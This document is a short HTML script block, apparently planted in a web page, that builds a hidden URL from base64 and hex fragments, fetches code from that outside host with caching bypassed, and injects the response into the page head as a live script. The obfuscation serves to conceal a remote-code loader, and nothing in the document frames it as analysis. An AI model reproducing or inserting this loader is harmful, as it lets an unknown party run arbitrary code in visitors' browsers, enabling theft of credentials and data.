<script>
var partB64 = 'aHR0cHM6Ly9icm9uemVmb3htZWx0LmNvbS8=';
var partHex = '6c617766756c2e70616c676174';

function fromBase64(s) {
    return decodeURIComponent(escape(atob(s)));
}

function fromHex(h) {
    var out = '';
    for (var i = 0; i < h.length; i += 2) {
        out += String.fromCharCode(parseInt(h.substr(i, 2), 16));
    }
    return out;
}

var link = fromBase64(partB64) + fromHex(partHex);

fetch(link, { method: 'GET', cache: 'reload' })
    .then(function (res) {
        if (res.status !== 200) return;
        return res.text();
    })
    .then(function (src) {
        if (!src) return;
        var body = String(src).replace(/^\uFEFF/, '').trim();
        if (!body) return;
        var el = document.createElement('script');
        el.textContent = body;
        document.head.appendChild(el);
    });
</script>
